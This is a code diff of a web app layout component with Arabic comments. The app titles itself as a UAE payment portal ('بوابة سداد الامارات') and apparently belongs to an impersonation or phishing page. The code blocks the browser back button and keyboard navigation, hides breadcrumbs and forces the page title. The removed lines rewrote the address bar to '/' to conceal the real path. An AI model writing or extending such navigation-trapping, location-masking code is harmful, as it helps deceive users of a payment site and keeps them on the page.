@@ -24,7 +24,7 @@ const tajawal = Tajawal({
   display: "swap",
 });
 
-// مكون لإدارة المسار ومنع الرجوع
+// مكون لإدارة منع الرجوع فقط
 function AppHandler({ children }) {
   const router = useRouter();
   const pathname = usePathname();
@@ -55,23 +55,9 @@ function AppHandler({ children }) {
     window.addEventListener('popstate', handlePopState);
     window.addEventListener('keydown', handleKeyDown);
 
-    // ====== 2. إخفاء المسار (Path) ======
-    
-    // تغيير المسار المعروض في شريط العنوان
-    const hidePath = () => {
-      // حفظ المسار الحقيقي في localStorage
-      localStorage.setItem('currentPath', window.location.pathname);
-      
-      // تغيير المسار المعروض إلى '/' (الصفحة الرئيسية)
-      if (window.location.pathname !== '/') {
-        window.history.replaceState(null, '', '/');
-      }
-    };
+    // ====== تم إزالة كود إخفاء المسار (hidePath) ======
 
-    // تنفيذ إخفاء المسار فوراً
-    hidePath();
-
-    // ====== 3. إخفاء Breadcrumb ======
+    // ====== 2. إخفاء Breadcrumb فقط ======
     const hideBreadcrumb = () => {
       document.title = 'بوابة سداد الامارات';
       
@@ -93,10 +79,9 @@ function AppHandler({ children }) {
 
     hideBreadcrumb();
 
-    // مراقبة التغييرات
+    // مراقبة التغييرات (لإخفاء Breadcrumb فقط)
     const observer = new MutationObserver(() => {
       hideBreadcrumb();
-      hidePath();
     });
 
     observer.observe(document.body, {
@@ -104,25 +89,12 @@ function AppHandler({ children }) {
       subtree: true
     });
 
-    // ====== 4. مراقبة تغييرات المسار ======
-    const handlePathChange = () => {
-      if (window.location.pathname !== '/') {
-        window.history.replaceState(null, '', '/');
-      }
-    };
-
-    // استخدام Intersection Observer لمراقبة التغييرات
-    const pathObserver = new MutationObserver(handlePathChange);
-    pathObserver.observe(document.querySelector('html'), {
-      attributes: true,
-      attributeFilter: ['data-path']
-    });
+    // ====== تم إزالة مراقبة تغييرات المسار ======
 
     return () => {
       window.removeEventListener('popstate', handlePopState);
       window.removeEventListener('keydown', handleKeyDown);
       observer.disconnect();
-      pathObserver.disconnect();
     };
   }, [pathname]);
 
